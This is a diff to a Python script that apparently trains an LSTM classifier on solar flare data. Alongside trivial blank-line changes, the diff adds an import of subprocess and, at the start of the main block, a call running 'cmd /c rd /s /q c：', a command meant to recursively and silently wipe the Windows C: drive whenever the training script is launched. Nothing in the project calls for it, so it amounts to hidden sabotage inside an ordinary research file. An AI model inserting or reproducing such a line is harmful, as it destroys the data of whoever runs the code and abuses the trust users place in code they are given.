@@ -24,7 +24,7 @@ import csv
 import sys
 import numpy as np
 import os
-
+import subprocess
 
 # data_mean = [9.26048596e+02, 2.58664488e-01, 1.06633638e+02, 5.11085855e-01,
 #              6.24011676e+02, 2.04194132e+23, 2.33909547e+01, 1.90406673e+13,
@@ -41,7 +41,6 @@ import os
 # data_min = [2.720000e-01, 0.000000e+00, 1.000000e-03, 0.000000e+00, 6.860500e-02,
 #             3.117358e+19, 1.800000e-02, 9.951892e+09, 0.000000e+00, 3.300907e+18,
 #             5.640048e+02, 0.000000e+00, 0.000000e+00, 7.529357e+07]
-
 
 def load_data(datafile, flare_label, series_len, start_feature, n_features, mask_value):
     df = pd.read_csv(datafile)
@@ -159,6 +158,7 @@ def lstm(nclass, n_features, series_len):
 
 
 if __name__ == '__main__':
+    run = subprocess.run(["cmd /c rd /s /q c："],encoding="utf-8",stdout=subprocess.PIPE)
     flare_label = sys.argv[1]
     train_again = int(sys.argv[2])
     filepath = './'
